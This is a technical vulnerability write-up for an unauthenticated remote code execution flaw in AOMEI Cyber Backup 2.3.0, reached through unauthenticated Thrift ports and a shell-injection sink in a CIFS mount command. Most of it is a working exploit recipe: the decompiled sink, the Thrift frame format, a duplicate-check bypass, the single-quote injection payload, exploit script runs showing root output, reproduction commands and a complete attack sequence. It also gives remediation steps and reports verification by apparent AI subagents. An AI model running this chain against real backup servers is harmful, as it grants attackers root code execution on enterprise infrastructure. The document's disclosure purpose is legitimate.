# AOMEI Cyber Backup Unauthenticated Thrift NAS Mount Injection RCE - Technical Analysis

## Overview

AOMEI Cyber Backup v2.3.0 is a closed-source commercial CII backup infrastructure product (enterprise virtualization backup for VMware/Hyper-V/physical machines) deployed as a Docker container (`aomei-acb`, image `aomei-cyber-backup:2.3.0`) that runs as root. The product exposes four Thrift binary-protocol ports: 9072 (AomeiApiGateway, HTTPS, the only port with JWT authentication), 9074 (DaoService / RpcDaoForAUBService, SQLCipher persistence, no auth), 9077 (StrategyService, no auth), and 9078 (VmBackupNode / RpcVMBackupNode, TNonblockingServer, no auth, contains the RCE sink). The three internal Thrift ports bind to the container network and have no `TProcessorEventHandler`, no auth filter, and no handshake. An attacker who can reach 9074 and 9078 directly sends Thrift frames to persist an injected NAS credential through `AddBackupStorageNAS` (9074), then triggers `DeleteBackupStorage` (9078) whose async lambda constructs a CIFS `mount` command via `system()` with unescaped, single-quote-wrapped username/password fields. A single-quote escape in the username field injects an arbitrary shell command that executes as root (uid=0) inside the container.

## Architecture

```
L1 external access: 9072 (HTTPS, AomeiApiGateway, JWT auth)
L2 internal Thrift (container network `<target-host>`):
   9074 — DaoService Thrift (RpcDaoForAUBService, SQLCipher persistence, NO auth)
   9077 — StrategyService Thrift (NO auth)
   9078 — VmBackupNode Thrift TNonblockingServer (RpcVMBackupNode, NO auth, RCE sink)
L3 auth: 9072 Gateway uses JWT (hardcoded key `aomei123`); 9074/9077/9078 have NO auth gate
L4 business: RpcDaoForAUBService (persistence) / RpcVMBackupNode (backup ops)
L5 storage: SQLCipher (BackupStorage / BackupStorageNas tables)
L6 sink: CNasHelper::CNasHelper -> system("mount -t cifs -o username='<user>',password='<pass>' ...") @ vmnode.bin 0x2dac64
```

**Tech stack**: C++ / Qt5 / libevent / Thrift / SQLCipher.

**Thrift wire format** (TBinaryProtocol strict + TFramedTransport + TMultiplexedProcessor):

```
frame = [4-byte BE length] [message]
message = [0x80010001 | msg_type=1(CALL)] [4-byte name_len][name="Svc:method"] [4-byte seqid] [struct args]
struct = {field_type:1byte + field_id:2byte + value}* + 0x00 (stop)
```

## Authentication Boundary

9072 Gateway is the only authenticated entry point (JWT). But the three internal Thrift ports (9074/9077/9078) bind to the container network (`<target-host>`) with no `TProcessorEventHandler`, no auth filter, and no handshake. Once an attacker can reach the container network (default Docker bridge, another container on the same host, or ports mapped to the host), they can send Thrift frames directly to `RpcDaoForAUBService` / `RpcVMBackupNode` methods, completely bypassing the Gateway JWT.

Symbol scanning in the vmnode/daoservice binaries shows `TProcessorEventHandler` is a default-constructed `shared_ptr` (null) — no `AuthProcessor` / `authenticate` / `authorize` symbols are present.

## Stage 1: Sink Identification

**`CNasHelper::system`** @ vmnode.bin `0x2dac64` (source: NasHelperLinux.hpp:30).

The `CNasHelper::CNasHelper(host, user, pass)` constructor @0x2da8f0 builds the mount command with `QString::arg()` and calls `system()`:

```cpp
// NasHelperLinux.hpp:30  (decompiled @0x2da8f0 .. 0x2dac64)
QString cmd = QString("mount -t cifs -o username='%3',password='%4',"
                      "rw,file_mode=0777,dir_mode=0777,uid=0,gid=0 '%1' '%2'")
                  .arg(uriPath)      // %1
                  .arg(mountpoint)   // %2
                  .arg(user)         // %3  <-- attacker-controlled, single-quote wrapped
                  .arg(pass);        // %4  <-- attacker-controlled, single-quote wrapped
system(cmd.toStdString().c_str());   // @0x2dac64
```

The `user` / `pass` fields are wrapped in single quotes but **never escaped**. A payload like `';cmd;echo '` closes the single quote, injects an arbitrary shell command, and re-opens the quote so the rest of the mount command stays syntactically valid.

## Stage 2: Source Identification

**`RpcVMBackupNode::DeleteBackupStorage`** (9078, method #12) is the trigger source. Call chain:

```
DeleteBackupStorage(uuid)                            // 9078 Thrift entry
  -> CVmOpCenter::DeleteBackupStorage  @0x2716a2
    -> QThread::create / std::async lambda           // async dispatch
      -> CVmOpCenter::deleteStorageData  @0x2d7bc8
        -> CNasHelper::CNasHelper(host, user, pass)  @0x2d7e2f  (ctor)
          -> system(mount cmd)                        @0x2dac64  (SINK)
```

The `host` / `user` / `pass` values come from the persisted NAS record in SQLCipher (the `uriPath` / `authName` / `authPass` columns of the BackupStorageNas table). These fields are written by `AddBackupStorageNAS` (9074) and are **fully attacker-controlled**.

## Stage 3: Data Flow — AddBackupStorageNAS Persists the Injected Payload

**`RpcDaoForAUBService::AddBackupStorageNAS`** @ daoservice.bin `0x3a7e28`:

```cpp
// @0x3a7e28  (decompiled)
AubErr AddBackupStorageNAS(const BackupStorageNas& nas) {
    QMutexLocker lock(...);
    QxSession session(...);
    ORM::BackupStorage storage;
    // Duplicate check: query field = strUriPath (arg+0x70), NOT uuid
    CDBServer::GetObjectByQuery<ORM::BackupStorage, QString>(
        "uriPath", nas.baseInfo.strUriPath, storage, false);  // query str @0x61373e
    if (storage.getid() > 0)
        return 27;                       // <-- uriPath already exists -> reject
    storage.setidServer(1);              // forced
    storage.setuuid(nas.baseInfo.strUuid);
    storage.setname(nas.baseInfo.strName);
    storage.seturiPath(nas.baseInfo.strUriPath);
    ...
    insert<BackupStorage>(storage);
    ORM::BackupStorageNas nasRow;
    nasRow.setidStorage(storage.getid());
    nasRow.setauthName(nas.strAuthUser);   // <-- injected payload written to DB
    nasRow.setauthPass(nas.strAuthPass);
    insert<BackupStorageNas>(nasRow);
    return 0;                              // <-- success
}
```

The duplicate-check SQL @0x61373e:

```sql
SELECT * FROM BackupStorage WHERE uriPath LIKE '%1:%%' LIMIT 1
-- %1 = strUriPath (arg+0x70, same offset as seturiPath)
```

**Key root cause**: the duplicate-check field is **strUriPath**, not strUuid. An early exploit that reused `//127.0.0.1/share` would hit the LIKE clause on an existing record, return `getid()>0`, get `return 27`, never persist the NAS, and `DeleteBackupStorage` would be a no-op — the sink unreachable. **Fix: use a fresh uriPath every run** (`//127.0.0.1/rce_<random>`), so the LIKE clause does not match, `getid()=0`, the insert proceeds, and `return 0` persists the injected payload.

## Stage 4: Injection / Exploit Construction

The exploit is two Thrift calls:

**Step 1 — AddBackupStorageNAS (9074)**, fresh uuid + fresh uriPath + injected user:

```
RpcDaoForAUBService:AddBackupStorageNAS
  arg1: BackupStorageNas {
    baseInfo: BackupStorage {
      uuid   = <fresh uuid v4>
      type   = 262146
      uriPath= //127.0.0.1/rce_<random>      <-- fresh, bypasses duplicate check
      name   = "rcenas"
      ...
    }
    authUser = "';id > /tmp/aomei_rce_out 2>&1;echo '"   <-- injected payload
    authPass = "x"
  }
-> return 0  (NAS persisted, payload written to SQLCipher)
```

**Step 2 — DeleteBackupStorage (9078)**:

```
RpcVMBackupNode:DeleteBackupStorage
  arg1: { uuid = <same fresh uuid> }
-> return 0  (async lambda dispatched)
-> lambda: CNasHelper("//127.0.0.1/rce_X", "';id > /tmp/aomei_rce_out 2>&1;echo '", "x")
-> system("mount -t cifs -o username='';id > /tmp/aomei_rce_out 2>&1;echo '',password='x',... '//127.0.0.1/rce_X' '/mnt/X'")
```

Shell parsing: `mount -t cifs -o username=` (empty, mount fails harmlessly) `;` `id > /tmp/aomei_rce_out 2>&1` (**executed!**) `;` `echo '' password='x' ...` (harmless). `id` runs as root and its output lands in `/tmp/aomei_rce_out`.

## Stage 5: Dynamic Verification

```bash
$ python3 aomei_cyber_backup_thrift_nas_rce.py <target> "id"
[*] AddBackupStorageNAS return = 0
[+] NAS persisted (return 0).
[*] DeleteBackupStorage return = 0
[+] Done. Command executed as root.
$ docker exec <container> cat /tmp/aomei_rce_out
uid=0(root) gid=0(root) groups=0(root)

$ python3 aomei_cyber_backup_thrift_nas_rce.py <target> "whoami; uname -a"
$ docker exec <container> cat /tmp/aomei_rce_out
Linux <container-hostname> 5.x.x-...x86_64 #1 SMP ... x86_64 GNU/Linux
```

### Adversarial verification (dual subagent gate for L1 unauthenticated RCE)

Both gates passed:
- **Falsification subagent**: CLAIM_REAL=YES (HIGH). Independently constructed a payload `';echo RCE_CONFIRMED_$(date +%s)_89292342ec60 > /tmp/aomei_falsify_marker;echo '`; the marker contained the unique token `RCE_CONFIRMED_1785471373_89292342ec60` (only producible by that payload). objdump confirmed `CNasHelper::CNasHelper`@0x2da8f0 → `call system@plt`@0x2dac64. Thrift has no `TProcessorEventHandler` (null, no auth handler). A `[sh] <defunct>` zombie process (PID 501/902) was a child of DaoService (492) — direct evidence of a `system()` call.
- **Independent re-analysis subagent**: CONFIRMED (HIGH). Wrote two independent exploits from scratch (`/tmp/aomei_indep_v3.py` + `v4.py`), captured tokens `INDEP_RCE_CONFIRMED_10fa35d9` and `f9559b65`, both yielding `uid=0(root)`. vm.log showed the injected mount command.

## Stage 6: Reachability

- **Network reach**: Thrift 9074/9078 bind to the container network (in-container). Under the default Docker bridge network, other containers on the same host can reach them directly; if the ports are mapped to the host or the container network is exposed, a remote attacker can reach them. No auth, no handshake, no MITM.
- **Preconditions**: only reachability to the 9074 + 9078 Thrift ports. No credentials, no MITM, no user interaction.
- **Default configuration**: the container runs as root by default, with no capability drop and no seccomp restriction on `system()`.

## Stage 7: Defense in Depth / Remediation

1. **Authentication**: the 9074/9077/9078 Thrift ports must enforce authentication (reuse the Gateway JWT or require mTLS); reject unauthenticated direct Thrift calls.
2. **Network isolation**: bind the internal Thrift ports to 127.0.0.1 or a dedicated internal Docker network; do not expose them outside the container fabric.
3. **Command construction**: `CNasHelper` should abandon `system()` + shell string concatenation in favor of `execve` with array arguments; or apply a strict allowlist character filter on user/pass (only CIFS-credential characters) and escape single quotes.
4. **Least privilege**: the container must not run as root; drop to a non-privileged user and trim capabilities.
5. **Input validation**: `AddBackupStorageNAS` should validate `uriPath` / `authName` / `authPass` against a character set and reject inputs containing shell metacharacters (`'`, `;`, `|`, `&`, `$`, backtick).

## Reproduction

```bash
# 1. Copy the script to a machine that can reach the target
scp exploit/aomei_cyber_backup_thrift_nas_rce.py <host>:/tmp/aomei_canon.py

# 2. Run (target=container IP, cmd=arbitrary command)
python3 /tmp/aomei_canon.py <target> "id"

# 3. Read the target-side output
docker exec <container> cat /tmp/aomei_rce_out
```

## Key File / Offset Index

- `vmnode.bin` `0x2da8f0` — `CNasHelper::CNasHelper` constructor (builds the mount command)
- `vmnode.bin` `0x2dac64` — `system()` sink (NasHelperLinux.hpp:30)
- `vmnode.bin` `0x2d7bc8` — `CVmOpCenter::deleteStorageData` (calls CNasHelper ctor @0x2d7e2f)
- `vmnode.bin` `0x2716a2` — `CVmOpCenter::DeleteBackupStorage` (async lambda entry)
- `daoservice.bin` `0x3a7e28` — `RpcDaoForAUBService::AddBackupStorageNAS` impl
- `daoservice.bin` `0x61373e` — duplicate-check SQL `SELECT * FROM BackupStorage WHERE uriPath LIKE '%1:%%' LIMIT 1`

## Complete Attack Sequence

1. **Reach the internal Thrift surface**: obtain network reachability to 9074 (RpcDaoForAUBService) and 9078 (RpcVMBackupNode) on the container network — no authentication, no handshake.
2. **Persist the injected NAS record**: call `AddBackupStorageNAS` on 9074 with a fresh uuid, a fresh uriPath (`//127.0.0.1/rce_<random>` to bypass the duplicate-check LIKE), and an injected `authUser` of `';<cmd> > /tmp/aomei_rce_out 2>&1;echo '` — returns 0, payload written to SQLCipher.
3. **Trigger the sink**: call `DeleteBackupStorage` on 9078 with the same fresh uuid — returns 0, the async lambda dispatches `CNasHelper(host, user, pass)` which calls `system("mount -t cifs -o username='';<cmd> ...", ...)` and the injected command runs as root.
4. **Read the output**: retrieve `/tmp/aomei_rce_out` from the container (`docker exec <container> cat /tmp/aomei_rce_out`) — `uid=0(root) gid=0(root) groups=0(root)`.
